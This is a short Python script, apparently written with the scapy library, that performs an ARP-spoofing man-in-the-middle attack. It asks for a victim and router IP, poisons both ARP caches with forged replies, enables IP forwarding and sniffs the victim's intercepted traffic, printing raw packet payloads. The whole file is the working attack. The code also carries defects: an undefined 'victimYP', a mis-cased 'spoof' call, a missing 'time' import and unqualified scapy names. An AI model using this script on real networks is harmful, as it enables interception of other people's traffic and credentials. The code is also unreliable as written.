import os
import sys
import scapy.all 

interface = raw_input("interface: \n")
victimIP = raw_input("victim: \n")
routerIP = raw_input("router: \n")

def MACSnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def Spoof(routerIP, victimIP):
    victimMAC = MACSnag(victimIP)
    routerMAC = MACSnag(routerIP)
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

def Restore(routerIP, victimIP):
    victimMAC = MACSnag(victimIP)
    routerMAC = MACSnag(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimYP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 4)
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

def sniffer():
    pkts = sniff(iface = interface, count = 10, prn = lambda x:x.sprintf(" Source: %IP.src% : %Ether.src% \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))

def MiddleMan():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            spoof(routerIP, victimIP)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit



if __name__ == "__main__":
    MiddleMan()
